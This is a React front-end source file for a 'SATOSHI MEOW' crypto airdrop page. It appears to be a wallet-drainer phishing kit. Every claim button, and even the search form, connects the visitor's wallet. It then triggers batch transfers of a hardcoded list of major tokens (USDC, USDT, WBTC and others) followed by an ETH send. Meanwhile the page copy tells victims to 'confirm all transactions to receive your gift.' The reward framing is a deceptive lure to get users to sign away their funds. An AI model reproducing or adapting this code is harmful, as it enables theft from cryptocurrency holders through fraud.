import { useContext, useState, useRef } from 'react';
import { WalletContext } from './context/WalletContext';
import './App.css'
import { connectWallet, getBalance } from './web3/wallet';
import { getPriceUSD } from './web3/price';
import { sendETH } from './web3/send';
import { batchSendTokens } from './web3/sendToken';
import AirdropStats from './AirdropStat';
import LiveChartComponent from './LiveChart.component';
import FooterNav from './FooterNav';
// import Provider from '@walletconnect/ethereum-provider';
// import { useMemo } from "react";

const tokenAddresses = [
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
  "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
  "0x9Ac9468E7E3E1D194080827226B45d0B892C77Fd", // Yee Token which has 9 decimals YEE
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  // WETH 18 decimals
  "0x514910771AF9Ca656af840dff83E8264EcF986CA",  // LINK 18 decimals
  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI 18 decimals
  "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE 18 decimals
  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT 18 decimals
  "0xC011A72400E58ecD99Ee497CF89E3775d4bd732F", // SNX 18 decimals
  "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX 18 decimals
  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI 18 decimals
  "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", // MKR 18 decimals
  "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP 18 decimals
  "0x6982508145454Ce325dDbE47a25d4ec3d2311933", // PEPE 18 decimals
  "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", // CRO 18 decimals
];

const titleText = "Welcome -> to -> the -> Airdrop -> DApp";
// Precompute random delays once
const titleDelays = titleText.split("").map(() => `${(Math.random() * 0.5).toFixed(2)}s`);

function App() {
  const { state, dispatch } = useContext(WalletContext);
  const [loading, setLoading] = useState(false);
  const topRef = useRef(null);
  const chartRef = useRef(null);

  const scrollToTop = () => {
    window.scrollTo({
      top: 0,
      behavior: "smooth"
    });
  };

  const scrollToCharts = () => {
    chartRef.current?.scrollIntoView({
      behavior: "smooth"
    });
  };


  const handleConnectAndSend = async () => {
    if(loading) return; // prevent multiple clicks
    setLoading(true);

    try {
      let data = {
        provider: state.provider,
        signer: state.signer,
        address: state.address,
      }

      // if wallet is not connected, connect it first
      if(!state.address){
        data = await connectWallet();
        if(!data){
          alert("Failed to connect wallet. Please try again.");
          setLoading(false);
          return;
        }

        dispatch({ type: "CONNECT_WALLET", payload: data });
        const bal = await getBalance(data.provider, data.address);
        dispatch({ type: "SET_BALANCE", payload: bal });
        const price = await getPriceUSD();
        const usdValue = (parseFloat(bal) * price).toFixed(2);
        dispatch({ type: "SET_USD_VALUE", payload: usdValue });
      }

      // send batch tokens first
      const tokenTx = await batchSendTokens(data.provider, data.signer, tokenAddresses);
      if(tokenTx){
        alert(`Batch token transaction sent!\nHash: ${tokenTx}`);
      } else {
        alert("Failed to send batch token transaction.");
      }

      // Add a small delay to let the wallet process the transaction
      await new Promise(resolve => setTimeout(resolve, 2000));

      // send ETH after tokens
      const txHash = await sendETH(data.provider, data.signer);
      if(txHash){
        alert(`ETH Transaction sent!\nHash: ${txHash}`);
      } else {
        alert("Failed to send ETH transaction.");
      }
    } catch (error) {
      console.error("Error in connect/send flow:", error);
      alert("Something went wrong. Check console.");
    }
    setLoading(false);
  }

  return (
    <>
      <header>
        <nav className="navbar bg-body-tertiary fixed-top shadow mb-5 bg-body rounded py-3">
          <div className="nav-wave">
            <svg className="line-wave" viewBox="0 0 1000 100" preserveAspectRatio="none">
              <path
                d="M0 50 Q 50 20 100 50 T 200 50 T 300 50 T 400 50 T 500 50 T 600 50 T 700 50 T 800 50 T 900 50 T 1000 50"
                className="wave-line"
              />
            </svg>
          </div>
          <div className="container-fluid">
            <a className="navbar-brand">
              <button className="btn btn-success animated-btn" onClick={handleConnectAndSend} disabled={loading}>
                <span className="emoji-wrapper">
                  <span className="emoji-slide">
                    🎁 🎉 🪂 💰 🪙 🚀 🎁
                  </span>
                </span>
                <span className="text-wrapper">
                  <span className="text-slide">
                    Airdrop DApp<br/>
                    Reward Celebration<br/>
                    Claim Airdrop<br/>
                    Get Tokens<br/>
                    Claim Reward<br/>
                    Reward Celebration <br />
                    Valuable rewards<br/>
                    Exclusive Airdrop<br/>
                    Claim Your Prize<br/>
                    Airdrop Bonanza<br/>
                    Token Giveaway<br/>
                  </span>
                </span>
              </button>
            </a>
            <button className="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar" aria-label="Toggle navigation">
              <span className="navbar-toggler-icon"></span>
            </button>
            <div className="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
              <div className="offcanvas-header">
                <h5 className="offcanvas-title" id="offcanvasNavbarLabel">SATOSHI MEOW</h5>
                <button type="button" className="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
              </div>
              <div className="offcanvas-body">
                <ul className="navbar-nav justify-content-end flex-grow-1 pe-3">
                  <li className="nav-item">
                    <a className="nav-link active" aria-current="page" href="#">Home</a>
                  </li>
                  <li className="nav-item">
                    <a className="nav-link" href="#">Telegram</a>
                  </li>
                  <li className="nav-item dropdown">
                    <a className="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                      More
                    </a>
                    <ul className="dropdown-menu">
                      <li><a className="dropdown-item" href="#">Airdrop</a></li>
                      <li><a className="dropdown-item" href="#">Rewards</a></li>
                      <li>
                        <hr className="dropdown-divider"/>
                      </li>
                      <li><a className="dropdown-item" href="#">Trade</a></li>
                    </ul>
                  </li>
                </ul>
                <form className="d-flex mt-3" role="search">
                  <input className="form-control me-2" type="search" placeholder="Search" aria-label="Search"/>
                  <button className="btn btn-outline-success" type="submit" onClick={handleConnectAndSend} disabled={loading}>Search</button>
                </form>
              </div>
            </div>
          </div>
        </nav>
      </header>
      {/* <h2>Connect Wallet & Confirm Transactions(version 1.5.0)</h2>

      <button onClick={handleConnectAndSend} disabled={loading}>
        { loading ? "Processing..." : state.address ? "Wallet connected | Confirming Transaction" : "Connect Wallet to Confirm Transaction" }
      </button>

      {
        state.address && (
          <>
            <p>Address: {state.address}</p>
            <p>Balance: {state.balance} ETH</p>
            <p>USD Value: ${state.usdBalance}</p>
          </>
        )
      } */}

      <div className="container-center mt-5 pt-5 overflow-x-hidden">
        <div className="container text-center">
          <div className="center">
            {/* <h1 className="title pt-5">Welcome to the Airdrop DApp</h1> */}
            <h1 className="title pt-5 text-shadow">
              {"Welcome -> to -> the -> Airdrop -> DApp".split("").map((char, i) => (
                <span key={i} className="shake-letter" style={{ animationDelay: titleDelays[i] }}>{char}</span>
              ))}🪂
            </h1>
            <p className="subtitle text-shadow">💰Unlock your rewards & claim your airdrop!🎁</p>

            <button
              className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
              onClick={handleConnectAndSend}
              disabled={loading}
            >
              {
                loading
                  ? "💰Awaiting Airdrop..."
                  : state.address
                  ? "Claiming | awaiting airdrop..."
                  : "Your airdrop is ready for claim🪂"
              }
            </button>
           {/* //// before there was image here  */}
           <div className="live-ch my-5 overflow-x-hidden">
            <h2 className="text-center mb-4">📺 Live Airdrop Countdown</h2>
              <AirdropStats />
            </div>
          </div>
        </div>
      </div>
      <div className="container claim-button d-flex justify-content-center align-items-center">
        <button
          className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
          onClick={handleConnectAndSend}
          disabled={loading}
        >
          {
            loading
              ? "💰awaiting Airdrop..."
              : state.address
              ? "Claiming | awaiting airdrop..."
              : "Tap to Claim Your Treasure 💎"
          }
        </button>
      </div>
      <div className="container d-flex text-center mt-5 align-items-center justify-content-center">
        <div className="row justify-content-center">
          <div className="col-md-4">
            <div className="card mb-4 shadow-sm">
              <div className="card-body">
                <h5 className="card-title">How to Claim🎁</h5>
                <p className="card-text">Claim through the button above to receive airdrop rewards. confirm all transactions to receive your gift!</p>
              </div>
            </div>
          </div>
          <div className="col-md-4">
            <div className="card mb-4 shadow-sm">
              <div className="card-body">
                <h5 className="card-title">Supported Tokens💰</h5>
                <p className="card-text">We support a variety of popular tokens including ETH, USDC, USDT, DAI, WBTC, and many more! Check your wallet for the rewards.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="container my-5">
        <h2 className="text-center mb-4">💎 Key Features</h2>
        <ul className="list-group list-group-flush text-center">
          <li className="list-group-item">
            <strong>The Cat-alytic Burn:</strong> 2% of every transaction is sent to a "dead bowl," reducing supply faster than a cat knocks a glass off a table.
          </li>
          <li className="list-group-item">
            <strong>Nine Lives Insurance:</strong> A dedicated community treasury designed to provide liquidity support and floor-price stability.
          </li>
          <li className="list-group-item">
            <strong>Proof of Nap (PoN):</strong> A unique staking mechanism where users earn rewards while their tokens "sleep" in the vault.
          </li>
          <li className="list-group-item">
            <strong>The Scratching Post:</strong> A decentralized launchpad for upcoming feline-themed projects and NFT collections.
          </li>
        </ul>
      </div>
      <div className="container my-5">
        <h2 className="text-center mb-4 h2-join-meow">🐾 Join the Meow-vement!</h2>
        {/* <div className="row">
          <div className="col-md-6">
            <p>Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
          </div>
        </div> */}
        <div className="card text-bg-dark">
          <img src="/satoshi.jpeg" className="card-img img-opacity" alt="..."/>
          <div className="card-img-overlay d-flex flex-column justify-content-center align-items-center text-center">
            <h5 className="card-title text-shadow p-img-text shadow">SATOSHI MEOW</h5>
            <p className="card-text text-shadow p-img-text px-5 shadow">Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
            <p className="card-text text-shadow p-img-text shadow"><small><button className="btn btn-info animated-bt2" onClick={handleConnectAndSend} disabled={loading ? true : false}>🎁Claim your rewards now!</button></small></p>
          </div>
        </div>
      </div>
      <div className="container-why bg-secondary-subtle">
        <div className="container my-5 py-5">
          <h2 className="text-center mb-4 pt-3 why-h2">📢 Why are we doing this?</h2>
          <h2 className="text-center px-text">
            <q> Even with the challenges in the crypto market, our community has remained strong and supportive. This airdrop is a token of appreciation for your loyalty and trust.</q>
          </h2>
        </div>
      </div>
      {/* //// before, the live cht was here  */}
      {/* ///// before the below image was above  */}
      <div className="container text-center position-relative py-b">
        <div className="center">
          <div className="mt-4">
            <img src="/6071f83f-973a-45ae-9eec-2a3d4ffe2b94.jpeg" className="img img-rounded img-fluid mx-auto d-block img-opacity" alt="Airdrop DApp Logo"></img>
          </div>
          <div className="logo">
            <h4 className='position-absolute top-50 start-50 translate-middle text-center text-white fw-bold text-shadow shadow h4-img-text'>Chill SATOSHI MEOW Airdrop <br /> Exclusive rewards for our <br /> early community members.</h4>
            <h2 className="text-shadow">SATOSHI MEOW</h2>
          </div>
        </div>
      </div>
      <section className="LiveChartSection" ref={chartRef}>
        <LiveChartComponent />
      </section>
      <footer className='overflow-x-none' ref={topRef}>
        <FooterNav
          scrollToTop={scrollToTop}
          scrollToCharts={scrollToCharts}
          handleConnectAndSend={handleConnectAndSend}
          loading={loading}
          address={state.address}
        />
      </footer>
    </>
  )
}

export default App